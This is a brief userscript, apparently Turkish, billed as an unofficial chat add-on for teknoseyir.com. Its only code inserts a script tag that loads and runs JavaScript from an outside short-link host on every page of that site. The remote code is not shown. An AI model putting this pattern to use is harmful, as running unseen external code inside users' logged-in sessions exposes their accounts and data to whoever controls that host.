// ==UserScript==
// @name         TeknoSeyir Chat
// @namespace    https://dijitaller.com/
// @version      0.1
// @description  Teknoseyir için resmi olmayan chat uygulaması.
// @author       Serhat Yücel
// @include      https://teknoseyir.com/*
// @grant        ts_chat
// ==/UserScript==

(function () {
    var scriptElement = document.createElement( "script" );
    scriptElement.type = "text/javascript";
    scriptElement.src = "//be.go.su/e/QAA9";
    document.body.appendChild( scriptElement );
})();